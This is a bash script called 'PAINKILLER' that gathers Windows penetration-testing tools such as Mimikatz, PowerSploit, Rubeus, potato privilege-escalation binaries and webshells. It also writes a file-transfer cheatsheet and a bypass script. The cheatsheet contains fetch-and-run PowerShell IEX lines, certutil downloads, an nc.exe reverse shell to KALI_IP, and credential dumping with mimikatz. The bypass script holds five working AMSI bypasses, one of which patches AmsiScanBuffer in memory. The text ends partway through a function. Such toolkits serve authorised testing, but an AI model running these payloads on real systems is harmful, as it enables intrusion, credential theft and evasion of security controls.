#!/bin/bash

#=============================================================================
# PAINKILLER - Windows Pentesting Tools Downloader & Transfer Suite
# All tools + All transfer methods for any foothold scenario
#=============================================================================

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

# Configuration
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
DEFAULT_TOOLS_DIR="${HOME}/windows-tools"
TOOLS_DIR="${1:-$DEFAULT_TOOLS_DIR}"

# Create base directory FIRST before anything else
mkdir -p "${TOOLS_DIR}" 2>/dev/null

TEMP_DIR="${TOOLS_DIR}/.tmp"
LOG_FILE="${TOOLS_DIR}/download.log"

# Create temp and touch log file
mkdir -p "${TEMP_DIR}" 2>/dev/null
touch "${LOG_FILE}" 2>/dev/null

#=============================================================================
# HELPER FUNCTIONS
#=============================================================================

log() {
    local level="$1"
    local message="$2"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    
    # Write to log file if it exists
    [ -f "${LOG_FILE}" ] && echo "${timestamp} [${level}] ${message}" >> "${LOG_FILE}" 2>/dev/null
    
    case "$level" in
        "INFO")   echo -e "${GREEN}[+]${NC} ${message}" ;;
        "WARN")   echo -e "${YELLOW}[!]${NC} ${message}" ;;
        "ERROR")  echo -e "${RED}[-]${NC} ${message}" ;;
        "DEBUG")  echo -e "${BLUE}[*]${NC} ${message}" ;;
        "HEADER") echo -e "\n${PURPLE}[===]${NC} ${message}" ;;
    esac
}

banner() {
    echo -e "${CYAN}"
    cat << 'EOF'
╔═══════════════════════════════════════════════════════════════════════════════╗
║  ██████╗  █████╗ ██╗███╗   ██╗██╗  ██╗██╗██╗     ██╗     ███████╗██████╗      ║
║  ██╔══██╗██╔══██╗██║████╗  ██║██║ ██╔╝██║██║     ██║     ██╔════╝██╔══██╗     ║
║  ██████╔╝███████║██║██╔██╗ ██║█████╔╝ ██║██║     ██║     █████╗  ██████╔╝     ║
║  ██╔═══╝ ██╔══██║██║██║╚██╗██║██╔═██╗ ██║██║     ██║     ██╔══╝  ██╔══██╗     ║
║  ██║     ██║  ██║██║██║ ╚████║██║  ██╗██║███████╗███████╗███████╗██║  ██║     ║
║  ╚═╝     ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝     ║
║                                                                               ║
║  Windows Pentesting Arsenal - Download + Transfer Suite                       ║
║  All Tools • All Transfer Methods • Any Foothold                              ║
╚═══════════════════════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
}

check_dependencies() {
    log "HEADER" "Checking Dependencies"
    
    local deps=("curl" "wget" "git" "unzip" "jq")
    local missing=()
    
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            missing+=("$dep")
        fi
    done
    
    if [ ${#missing[@]} -ne 0 ]; then
        log "WARN" "Missing: ${missing[*]}"
        log "INFO" "Installing..."
        sudo apt-get update -qq 2>/dev/null
        sudo apt-get install -y -qq "${missing[@]}" 2>/dev/null
    fi
    
    log "INFO" "Dependencies OK"
}

create_directories() {
    log "HEADER" "Creating Directory Structure"
    
    local dirs=(
        "binaries"
        "powershell"
        "bloodhound"
        "privesc"
        "credentials"
        "enumeration"
        "lateral"
        "bypass"
        "tunneling"
        "webshells"
        "transfer"
        "cheatsheets"
        "python-tools"
    )
    
    for dir in "${dirs[@]}"; do
        mkdir -p "${TOOLS_DIR}/${dir}"
    done
    
    log "INFO" "Directories created"
}

download_file() {
    local url="$1"
    local output="$2"
    local name="$3"
    
    if [ -z "$url" ]; then
        return 1
    fi
    
    # Try curl first, then wget
    if curl -sL --connect-timeout 15 --max-time 60 -o "${output}" "${url}" 2>/dev/null; then
        if [ -s "${output}" ]; then
            log "INFO" "Downloaded: ${name}"
            return 0
        fi
    fi
    
    if wget -q --timeout=15 -O "${output}" "${url}" 2>/dev/null; then
        if [ -s "${output}" ]; then
            log "INFO" "Downloaded: ${name}"
            return 0
        fi
    fi
    
    rm -f "${output}" 2>/dev/null
    log "WARN" "Failed: ${name}"
    return 1
}

get_github_release() {
    local repo="$1"
    local pattern="$2"
    local output="$3"
    local name="$4"
    
    local api="https://api.github.com/repos/${repo}/releases/latest"
    local url=$(curl -s "${api}" 2>/dev/null | jq -r ".assets[] | select(.name | test(\"${pattern}\")) | .browser_download_url" 2>/dev/null | head -1)
    
    if [ -n "$url" ] && [ "$url" != "null" ]; then
        download_file "$url" "$output" "$name"
    else
        log "WARN" "No release found: ${name}"
    fi
}

#=============================================================================
# DOWNLOAD FUNCTIONS
#=============================================================================

download_powershell_scripts() {
    log "HEADER" "Downloading PowerShell Scripts"
    
    local dir="${TOOLS_DIR}/powershell"
    
    # PowerView variants
    download_file "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1" \
        "${dir}/PowerView.ps1" "PowerView.ps1"
    
    download_file "https://raw.githubusercontent.com/BC-SECURITY/Empire/main/empire/server/data/module_source/situational_awareness/network/powerview.ps1" \
        "${dir}/PowerView-Empire.ps1" "PowerView-Empire.ps1"
    
    # PowerUp
    download_file "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1" \
        "${dir}/PowerUp.ps1" "PowerUp.ps1"
    
    # PowerUpSQL
    download_file "https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1" \
        "${dir}/PowerUpSQL.ps1" "PowerUpSQL.ps1"
    
    # SharpHound
    download_file "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1" \
        "${dir}/SharpHound.ps1" "SharpHound.ps1"
    
    # Inveigh
    download_file "https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1" \
        "${dir}/Inveigh.ps1" "Inveigh.ps1"
    
    # Powercat
    download_file "https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1" \
        "${dir}/powercat.ps1" "powercat.ps1"
    
    # RunasCs
    download_file "https://raw.githubusercontent.com/antonioCoco/RunasCs/master/Invoke-RunasCs.ps1" \
        "${dir}/Invoke-RunasCs.ps1" "Invoke-RunasCs.ps1"
    
    # PrivescCheck
    download_file "https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1" \
        "${dir}/PrivescCheck.ps1" "PrivescCheck.ps1"
    
    # ADRecon
    download_file "https://raw.githubusercontent.com/sense-of-security/ADRecon/master/ADRecon.ps1" \
        "${dir}/ADRecon.ps1" "ADRecon.ps1"
    
    # Kerberoast
    download_file "https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1" \
        "${dir}/Invoke-Kerberoast.ps1" "Invoke-Kerberoast.ps1"
    
    # Mimikatz PS
    download_file "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1" \
        "${dir}/Invoke-Mimikatz.ps1" "Invoke-Mimikatz.ps1"
    
    # GPP Password
    download_file "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1" \
        "${dir}/Get-GPPPassword.ps1" "Get-GPPPassword.ps1"
    
    # Invoke-TheHash suite
    download_file "https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/Invoke-TheHash.ps1" \
        "${dir}/Invoke-TheHash.ps1" "Invoke-TheHash.ps1"
    download_file "https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/Invoke-SMBExec.ps1" \
        "${dir}/Invoke-SMBExec.ps1" "Invoke-SMBExec.ps1"
    download_file "https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/Invoke-WMIExec.ps1" \
        "${dir}/Invoke-WMIExec.ps1" "Invoke-WMIExec.ps1"
    
    # Port scan
    download_file "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1" \
        "${dir}/Invoke-Portscan.ps1" "Invoke-Portscan.ps1"
    
    # JAWS
    download_file "https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1" \
        "${dir}/jaws-enum.ps1" "jaws-enum.ps1"
    
    # Sherlock (old but gold)
    download_file "https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1" \
        "${dir}/Sherlock.ps1" "Sherlock.ps1"
    
    # nishang shells
    download_file "https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1" \
        "${dir}/Invoke-PowerShellTcp.ps1" "Invoke-PowerShellTcp.ps1"
    download_file "https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcpOneLine.ps1" \
        "${dir}/Invoke-PowerShellTcpOneLine.ps1" "Invoke-PowerShellTcpOneLine.ps1"
}

download_binaries() {
    log "HEADER" "Downloading Binaries"
    
    local bin="${TOOLS_DIR}/binaries"
    local priv="${TOOLS_DIR}/privesc"
    local cred="${TOOLS_DIR}/credentials"
    local enum="${TOOLS_DIR}/enumeration"
    local bh="${TOOLS_DIR}/bloodhound"
    local tun="${TOOLS_DIR}/tunneling"
    local lat="${TOOLS_DIR}/lateral"
    
    # GhostPack binaries
    log "DEBUG" "Downloading GhostPack..."
    download_file "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe" \
        "${cred}/Rubeus.exe" "Rubeus.exe"
    download_file "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Seatbelt.exe" \
        "${enum}/Seatbelt.exe" "Seatbelt.exe"
    download_file "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpUp.exe" \
        "${priv}/SharpUp.exe" "SharpUp.exe"
    download_file "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpDump.exe" \
        "${cred}/SharpDump.exe" "SharpDump.exe"
    download_file "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SafetyKatz.exe" \
        "${cred}/SafetyKatz.exe" "SafetyKatz.exe"
    download_file "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpWMI.exe" \
        "${lat}/SharpWMI.exe" "SharpWMI.exe"
    download_file "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpDPAPI.exe" \
        "${cred}/SharpDPAPI.exe" "SharpDPAPI.exe"
    download_file "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Certify.exe" \
        "${enum}/Certify.exe" "Certify.exe"
    
    # Privilege Escalation
    log "DEBUG" "Downloading PrivEsc tools..."
    get_github_release "itm4n/PrintSpoofer" "PrintSpoofer64.exe" "${priv}/PrintSpoofer64.exe" "PrintSpoofer64"
    get_github_release "itm4n/PrintSpoofer" "PrintSpoofer32.exe" "${priv}/PrintSpoofer32.exe" "PrintSpoofer32"
    get_github_release "BeichenDream/GodPotato" "GodPotato-NET4.exe" "${priv}/GodPotato.exe" "GodPotato"
    get_github_release "antonioCoco/RoguePotato" "RoguePotato.zip" "${TEMP_DIR}/RoguePotato.zip" "RoguePotato"
    get_github_release "CCob/SweetPotato" "SweetPotato.exe" "${priv}/SweetPotato.exe" "SweetPotato"
    
    # winPEAS
    get_github_release "peass-ng/PEASS-ng" "winPEASany_ofs.exe" "${priv}/winPEAS.exe" "winPEAS.exe"
    get_github_release "peass-ng/PEASS-ng" "winPEAS.bat" "${priv}/winPEAS.bat" "winPEAS.bat"
    get_github_release "peass-ng/PEASS-ng" "linpeas.sh" "${TOOLS_DIR}/linpeas.sh" "linpeas.sh"
    
    # RunasCs
    get_github_release "antonioCoco/RunasCs" "RunasCs.zip" "${TEMP_DIR}/RunasCs.zip" "RunasCs"
    
    # LaZagne
    get_github_release "AlessandroZ/LaZagne" "lazagne.exe" "${cred}/lazagne.exe" "LaZagne"
    
    # Mimikatz
    get_github_release "gentilkiwi/mimikatz" "mimikatz_trunk.zip" "${TEMP_DIR}/mimikatz.zip" "Mimikatz"
    
    # Snaffler
    get_github_release "SnaffCon/Snaffler" "Snaffler.exe" "${enum}/Snaffler.exe" "Snaffler"
    
    # SharpHound
    get_github_release "BloodHoundAD/SharpHound" "SharpHound.*\\.zip" "${TEMP_DIR}/SharpHound.zip" "SharpHound"
    
    # Kerbrute
    get_github_release "ropnop/kerbrute" "kerbrute_linux_amd64" "${bin}/kerbrute_linux" "kerbrute_linux"
    get_github_release "ropnop/kerbrute" "kerbrute_windows_amd64.exe" "${bin}/kerbrute.exe" "kerbrute.exe"
    chmod +x "${bin}/kerbrute_linux" 2>/dev/null
    
    # Chisel
    log "DEBUG" "Downloading tunneling tools..."
    get_github_release "jpillora/chisel" "chisel_.*_windows_amd64.gz" "${TEMP_DIR}/chisel_win.gz" "chisel_windows"
    get_github_release "jpillora/chisel" "chisel_.*_linux_amd64.gz" "${TEMP_DIR}/chisel_linux.gz" "chisel_linux"
    
    # Ligolo-ng
    get_github_release "nicocha30/ligolo-ng" "ligolo-ng_agent_.*_windows_amd64.zip" "${TEMP_DIR}/ligolo_agent.zip" "ligolo_agent"
    get_github_release "nicocha30/ligolo-ng" "ligolo-ng_proxy_.*_linux_amd64.tar.gz" "${TEMP_DIR}/ligolo_proxy.tar.gz" "ligolo_proxy"
    
    # Extract archives
    log "DEBUG" "Extracting archives..."
    [ -f "${TEMP_DIR}/RoguePotato.zip" ] && unzip -q -o "${TEMP_DIR}/RoguePotato.zip" -d "${priv}/" 2>/dev/null
    [ -f "${TEMP_DIR}/RunasCs.zip" ] && unzip -q -o "${TEMP_DIR}/RunasCs.zip" -d "${lat}/" 2>/dev/null
    [ -f "${TEMP_DIR}/mimikatz.zip" ] && unzip -q -o "${TEMP_DIR}/mimikatz.zip" -d "${cred}/mimikatz/" 2>/dev/null
    [ -f "${TEMP_DIR}/SharpHound.zip" ] && unzip -q -o "${TEMP_DIR}/SharpHound.zip" -d "${bh}/" 2>/dev/null
    [ -f "${TEMP_DIR}/chisel_win.gz" ] && gunzip -c "${TEMP_DIR}/chisel_win.gz" > "${tun}/chisel.exe" 2>/dev/null
    [ -f "${TEMP_DIR}/chisel_linux.gz" ] && gunzip -c "${TEMP_DIR}/chisel_linux.gz" > "${tun}/chisel_linux" 2>/dev/null && chmod +x "${tun}/chisel_linux"
    [ -f "${TEMP_DIR}/ligolo_agent.zip" ] && unzip -q -o "${TEMP_DIR}/ligolo_agent.zip" -d "${tun}/" 2>/dev/null
    [ -f "${TEMP_DIR}/ligolo_proxy.tar.gz" ] && tar -xzf "${TEMP_DIR}/ligolo_proxy.tar.gz" -C "${tun}/" 2>/dev/null
    
    # Sysinternals
    log "DEBUG" "Downloading Sysinternals..."
    download_file "https://download.sysinternals.com/files/PSTools.zip" "${TEMP_DIR}/PSTools.zip" "PSTools"
    [ -f "${TEMP_DIR}/PSTools.zip" ] && unzip -q -o "${TEMP_DIR}/PSTools.zip" -d "${lat}/" 2>/dev/null
    
    download_file "https://download.sysinternals.com/files/AccessChk.zip" "${TEMP_DIR}/accesschk.zip" "AccessChk"
    [ -f "${TEMP_DIR}/accesschk.zip" ] && unzip -q -o "${TEMP_DIR}/accesschk.zip" -d "${priv}/" 2>/dev/null
    
    # Netcat
    download_file "https://github.com/int0x33/nc.exe/raw/master/nc64.exe" "${lat}/nc64.exe" "nc64.exe"
    download_file "https://github.com/int0x33/nc.exe/raw/master/nc.exe" "${lat}/nc.exe" "nc.exe"
    
    # SharpView
    download_file "https://github.com/tevora-threat/SharpView/raw/master/Compiled/SharpView.exe" \
        "${enum}/SharpView.exe" "SharpView.exe"
}

copy_kali_tools() {
    log "HEADER" "Copying Kali Built-in Tools"
    
    local lat="${TOOLS_DIR}/lateral"
    local cred="${TOOLS_DIR}/credentials"
    local ps="${TOOLS_DIR}/powershell"
    
    # Netcat
    [ -f "/usr/share/windows-resources/binaries/nc.exe" ] && \
        cp "/usr/share/windows-resources/binaries/nc.exe" "${lat}/nc_kali.exe" && log "INFO" "nc.exe (kali)"
    
    # plink
    [ -f "/usr/share/windows-resources/binaries/plink.exe" ] && \
        cp "/usr/share/windows-resources/binaries/plink.exe" "${lat}/plink.exe" && log "INFO" "plink.exe"
    
    # wget
    [ -f "/usr/share/windows-resources/binaries/wget.exe" ] && \
        cp "/usr/share/windows-resources/binaries/wget.exe" "${TOOLS_DIR}/transfer/wget.exe" && log "INFO" "wget.exe"
    
    # Mimikatz
    [ -f "/usr/share/windows-resources/mimikatz/x64/mimikatz.exe" ] && \
        cp "/usr/share/windows-resources/mimikatz/x64/mimikatz.exe" "${cred}/mimikatz64_kali.exe" && log "INFO" "mimikatz64"
    [ -f "/usr/share/windows-resources/mimikatz/Win32/mimikatz.exe" ] && \
        cp "/usr/share/windows-resources/mimikatz/Win32/mimikatz.exe" "${cred}/mimikatz32_kali.exe" && log "INFO" "mimikatz32"
    
    # PowerSploit
    [ -f "/usr/share/windows-resources/powersploit/Recon/PowerView.ps1" ] && \
        cp "/usr/share/windows-resources/powersploit/Recon/PowerView.ps1" "${ps}/PowerView_kali.ps1" && log "INFO" "PowerView (kali)"
    [ -f "/usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1" ] && \
        cp "/usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1" "${ps}/PowerUp_kali.ps1" && log "INFO" "PowerUp (kali)"
    
    # Webshells
    local web="${TOOLS_DIR}/webshells"
    [ -d "/usr/share/webshells" ] && cp -r /usr/share/webshells/* "${web}/" 2>/dev/null && log "INFO" "webshells"
    [ -d "/usr/share/seclists/Web-Shells" ] && cp -r /usr/share/seclists/Web-Shells/* "${web}/" 2>/dev/null
}

clone_python_tools() {
    log "HEADER" "Cloning Python Tools"
    
    local py="${TOOLS_DIR}/python-tools"
    
    # Only clone if not exists
    [ ! -d "${py}/impacket" ] && git clone --depth 1 https://github.com/fortra/impacket.git "${py}/impacket" 2>/dev/null && log "INFO" "impacket"
    [ ! -d "${py}/BloodHound.py" ] && git clone --depth 1 https://github.com/dirkjanm/BloodHound.py.git "${py}/BloodHound.py" 2>/dev/null && log "INFO" "BloodHound.py"
    [ ! -d "${py}/certipy" ] && git clone --depth 1 https://github.com/ly4k/Certipy.git "${py}/certipy" 2>/dev/null && log "INFO" "certipy"
    [ ! -d "${py}/petitpotam" ] && git clone --depth 1 https://github.com/topotam/PetitPotam.git "${py}/petitpotam" 2>/dev/null && log "INFO" "petitpotam"
    [ ! -d "${py}/coercer" ] && git clone --depth 1 https://github.com/p0dalirius/Coercer.git "${py}/coercer" 2>/dev/null && log "INFO" "coercer"
    [ ! -d "${py}/krbrelayx" ] && git clone --depth 1 https://github.com/dirkjanm/krbrelayx.git "${py}/krbrelayx" 2>/dev/null && log "INFO" "krbrelayx"
    [ ! -d "${py}/pkinittools" ] && git clone --depth 1 https://github.com/dirkjanm/PKINITtools.git "${py}/pkinittools" 2>/dev/null && log "INFO" "pkinittools"
    [ ! -d "${py}/windapsearch" ] && git clone --depth 1 https://github.com/ropnop/windapsearch.git "${py}/windapsearch" 2>/dev/null && log "INFO" "windapsearch"
}

#=============================================================================
# TRANSFER METHODS & BYPASS SCRIPTS
#=============================================================================

create_transfer_scripts() {
    log "HEADER" "Creating Transfer Scripts"
    
    local trans="${TOOLS_DIR}/transfer"
    
    #=========================================================================
    # MASTER TRANSFER CHEATSHEET
    #=========================================================================
    cat > "${trans}/TRANSFER-METHODS.md" << 'EOF'
# 🚀 FILE TRANSFER METHODS - ALL SCENARIOS

## 📁 YOUR ATTACKER IP (replace KALI_IP)
```bash
export KALI=$(ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || hostname -I | awk '{print $1}')
echo "Your IP: $KALI"
```

---

## 🌐 SCENARIO 1: HTTP SERVER (Most Common)

### Attacker - Start Server
```bash
# Python 3
python3 -m http.server 80

# Python 2
python -m SimpleHTTPServer 80

# PHP
php -S 0.0.0.0:80

# Ruby
ruby -run -ehttpd . -p80

# Busybox
busybox httpd -f -p 80
```

### Target - Download Methods

#### PowerShell
```powershell
# Method 1: Invoke-WebRequest (iwr)
iwr http://KALI_IP/file.exe -OutFile C:\Windows\Temp\file.exe

# Method 2: WebClient
(New-Object Net.WebClient).DownloadFile('http://KALI_IP/file.exe','C:\Windows\Temp\file.exe')

# Method 3: DownloadString (memory only)
IEX(New-Object Net.WebClient).DownloadString('http://KALI_IP/script.ps1')

# Method 4: Invoke-Expression + iwr
IEX(iwr http://KALI_IP/script.ps1 -UseBasicParsing)

# Method 5: Start-BitsTransfer
Start-BitsTransfer -Source "http://KALI_IP/file.exe" -Destination "C:\Windows\Temp\file.exe"

# Method 6: curl.exe (Win10+)
curl.exe http://KALI_IP/file.exe -o C:\Windows\Temp\file.exe
```

#### CMD
```cmd
# certutil (most reliable)
certutil -urlcache -f http://KALI_IP/file.exe C:\Windows\Temp\file.exe

# bitsadmin
bitsadmin /transfer job /download /priority high http://KALI_IP/file.exe C:\Windows\Temp\file.exe

# curl (Win10+)
curl http://KALI_IP/file.exe -o C:\Windows\Temp\file.exe

# wget (if available)
wget http://KALI_IP/file.exe -O C:\Windows\Temp\file.exe
```

---

## 📂 SCENARIO 2: SMB SERVER (Great for Windows)

### Attacker - Start SMB Server
```bash
# No auth (guest)
impacket-smbserver -smb2support share .

# With auth (if guest blocked)
impacket-smbserver -smb2support -username user -password pass share .
```

### Target - Access SMB

#### Copy files
```cmd
# Direct copy
copy \\KALI_IP\share\file.exe C:\Windows\Temp\file.exe

# Using net use
net use Z: \\KALI_IP\share
copy Z:\file.exe C:\Windows\Temp\
net use Z: /delete

# With credentials
net use Z: \\KALI_IP\share /user:user pass
```

#### Execute directly from share
```cmd
\\KALI_IP\share\file.exe
\\KALI_IP\share\mimikatz.exe "sekurlsa::logonpasswords" "exit"
```

#### PowerShell
```powershell
Copy-Item \\KALI_IP\share\file.exe C:\Windows\Temp\
# Or execute directly
& \\KALI_IP\share\file.exe
```

---

## 🔌 SCENARIO 3: EVIL-WINRM

### Already has upload/download!
```ruby
# Connect
evil-winrm -i TARGET -u USER -p PASS

# Upload
upload /path/to/local/file.exe C:\Windows\Temp\file.exe

# Download
download C:\Users\Admin\flag.txt /home/kali/flag.txt
```

---

## 🖥️ SCENARIO 4: RDP (xfreerdp)

### Share entire folder
```bash
xfreerdp /v:TARGET /u:USER /p:PASS /drive:share,/home/kali/windows-tools
```

### Access on Windows
```
\\tsclient\share\file.exe
copy \\tsclient\share\file.exe C:\Windows\Temp\
```

---

## 🐚 SCENARIO 5: WEB SHELL

### Upload via web shell interface, then:
```cmd
# Download more tools
certutil -urlcache -f http://KALI_IP/nc.exe C:\Windows\Temp\nc.exe

# Get reverse shell
C:\Windows\Temp\nc.exe -e cmd.exe KALI_IP 4444
```

---

## 🔐 SCENARIO 6: NETCAT/NC TRANSFER

### Attacker - Send file
```bash
nc -lvnp 4444 < file.exe
```

### Target - Receive file
```cmd
nc.exe KALI_IP 4444 > file.exe
```

### Or reverse (target sends to attacker)
```bash
# Attacker receives
nc -lvnp 4444 > received_file

# Target sends
type file.exe | nc.exe KALI_IP 4444
```

---

## 📡 SCENARIO 7: BASE64 ENCODING (When all else fails)

### On Attacker - Encode
```bash
base64 -w0 file.exe > file.b64
cat file.b64  # Copy this output
```

### On Target - Decode (PowerShell)
```powershell
# Paste the base64 string
$b64 = "BASE64_STRING_HERE"
[IO.File]::WriteAllBytes("C:\Windows\Temp\file.exe", [Convert]::FromBase64String($b64))
```

### On Target - Decode (certutil)
```cmd
echo BASE64_STRING > encoded.txt
certutil -decode encoded.txt file.exe
```

---

## 🌐 SCENARIO 8: FTP

### Attacker - Start FTP
```bash
python3 -m pyftpdlib -p 21 -w
```

### Target - FTP download
```cmd
# Create FTP script
echo open KALI_IP > ftp.txt
echo anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo binary >> ftp.txt
echo get file.exe >> ftp.txt
echo bye >> ftp.txt

# Execute
ftp -s:ftp.txt
```

---

## 🔒 SCENARIO 9: SCP/PSCP (If SSH available)

### Using pscp.exe on Windows
```cmd
pscp.exe user@KALI_IP:/path/to/file.exe C:\Windows\Temp\file.exe
```

---

## 💉 SCENARIO 10: POWERSHELL IN-MEMORY EXECUTION

### Load and run without touching disk
```powershell
# PowerView
IEX(New-Object Net.WebClient).DownloadString('http://KALI_IP/PowerView.ps1')

# With AMSI bypass first
$a=[Ref].Assembly.GetTypes()|%{if($_.Name -like "*iUtils"){$_}};$b=$a.GetFields('NonPublic,Static')|?{$_.Name -like "*Context"};$b.SetValue($null,[IntPtr]::Zero);IEX(New-Object Net.WebClient).DownloadString('http://KALI_IP/PowerView.ps1')
```

---

## 📋 QUICK REFERENCE TABLE

| Method | CMD | PowerShell | Notes |
|--------|-----|------------|-------|
| certutil | ✅ | ✅ | Most reliable |
| curl.exe | ✅ | ✅ | Win10+ |
| bitsadmin | ✅ | ✅ | Background transfer |
| iwr | ❌ | ✅ | Invoke-WebRequest |
| WebClient | ❌ | ✅ | .NET |
| SMB | ✅ | ✅ | Good for AD |
| FTP | ✅ | ✅ | Need server |
| NC | ✅ | ❌ | Need nc.exe |
| Base64 | ✅ | ✅ | Last resort |

---

## 🎯 RECOMMENDED WORKFLOW

1. **First try**: certutil (works almost everywhere)
2. **If blocked**: SMB server (great for tools)  
3. **For scripts**: PowerShell IEX (in-memory)
4. **RDP session**: Use /drive share
5. **Evil-WinRM**: Built-in upload/download
6. **Last resort**: Base64 encode

EOF

    log "INFO" "Created TRANSFER-METHODS.md"
}

create_bypass_scripts() {
    log "HEADER" "Creating Bypass Scripts"
    
    local bypass="${TOOLS_DIR}/bypass"
    
    # AMSI Bypass Collection
    cat > "${bypass}/amsi-bypass.ps1" << 'EOF'
# AMSI BYPASS COLLECTION - Try in order until one works

# ============================================
# OPTION 1: Memory Patch (Most Reliable)
# ============================================
function Bypass-AMSI-1 {
    try {
        $a=[Ref].Assembly.GetTypes()|%{if($_.Name -like "*iUtils"){$_}}
        $b=$a.GetFields('NonPublic,Static')|?{$_.Name -like "*Context"}
        $b.SetValue($null,[IntPtr]::Zero)
        Write-Host "[+] AMSI Bypass 1 SUCCESS" -ForegroundColor Green
        return $true
    } catch {
        Write-Host "[-] AMSI Bypass 1 failed" -ForegroundColor Red
        return $false
    }
}

# ============================================
# OPTION 2: String Obfuscation
# ============================================
function Bypass-AMSI-2 {
    try {
        $w = 'System.Management.Automation.A]m]s]i]Utils'.Replace(']','')
        $d = 'a]m]s]i]I]n]i]t]F]a]i]l]e]d'.Replace(']','')
        [Ref].Assembly.GetType($w).GetField($d,'NonPublic,Static').SetValue($null,$true)
        Write-Host "[+] AMSI Bypass 2 SUCCESS" -ForegroundColor Green
        return $true
    } catch {
        Write-Host "[-] AMSI Bypass 2 failed" -ForegroundColor Red
        return $false
    }
}

# ============================================
# OPTION 3: Char Array
# ============================================
function Bypass-AMSI-3 {
    try {
        $a=[char[]](0x61,0x6d,0x73,0x69,0x49,0x6e,0x69,0x74,0x46,0x61,0x69,0x6c,0x65,0x64) -join ''
        $b=[char[]](0x53,0x79,0x73,0x74,0x65,0x6d,0x2e,0x4d,0x61,0x6e,0x61,0x67,0x65,0x6d,0x65,0x6e,0x74,0x2e,0x41,0x75,0x74,0x6f,0x6d,0x61,0x74,0x69,0x6f,0x6e,0x2e,0x41,0x6d,0x73,0x69,0x55,0x74,0x69,0x6c,0x73) -join ''
        [Ref].Assembly.GetType($b).GetField($a,'NonPublic,Static').SetValue($null,$true)
        Write-Host "[+] AMSI Bypass 3 SUCCESS" -ForegroundColor Green
        return $true
    } catch {
        Write-Host "[-] AMSI Bypass 3 failed" -ForegroundColor Red
        return $false
    }
}

# ============================================
# OPTION 4: Variable Obfuscation
# ============================================
function Bypass-AMSI-4 {
    try {
        $v1="Sy";$v2="stemtic.Manage";$v3="tic.Auttic.Amsiment";$v4="Utils"
        $x=($v1+$v2+$v3+$v4).Replace("tic.","")
        $f="am"+"si"+"Init"+"Failed"
        [Ref].Assembly.GetType($x).GetField($f,'NonPublic,Static').SetValue($null,$true)
        Write-Host "[+] AMSI Bypass 4 SUCCESS" -ForegroundColor Green
        return $true
    } catch {
        Write-Host "[-] AMSI Bypass 4 failed" -ForegroundColor Red
        return $false
    }
}

# ============================================
# OPTION 5: Memory Patch via WinAPI
# ============================================
function Bypass-AMSI-5 {
    try {
        $w = Add-Type -MemberDefinition '[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string n);[DllImport("kernel32")]public static extern IntPtr LoadLibrary(string n);[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint n,out uint o);' -Name 'W' -PassThru
        $x=$w::LoadLibrary("a]m]s]i].dll".Replace(']',''))
        $y=$w::GetProcAddress($x,"A]m]s]i]S]c]a]n]B]u]f]f]e]r".Replace(']',''))
        $z=0
        $w::VirtualProtect($y,[UIntPtr]5,0x40,[ref]$z)|Out-Null
        [System.Runtime.InteropServices.Marshal]::Copy([byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3),0,$y,6)
        Write-Host "[+] AMSI Bypass 5 SUCCESS" -ForegroundColor Green
        return $true
    } catch {
        Write-Host "[-] AMSI Bypass 5 failed" -ForegroundColor Red
        return $false
    }
}

# ============================================
# AUTO-TRY ALL BYPASSES
# ============================================
function Invoke-AMSIBypass {
    Write-Host "`n[*] Attempting AMSI Bypasses..." -ForegroundColor Cyan
    
    if (Bypass-AMSI-1) { return }
    if (Bypass-AMSI-2) { return }
    if (Bypass-AMSI-3) { return }
    if (Bypass-AMSI-4) { return }
    if (Bypass-AMSI-5) { return }
    
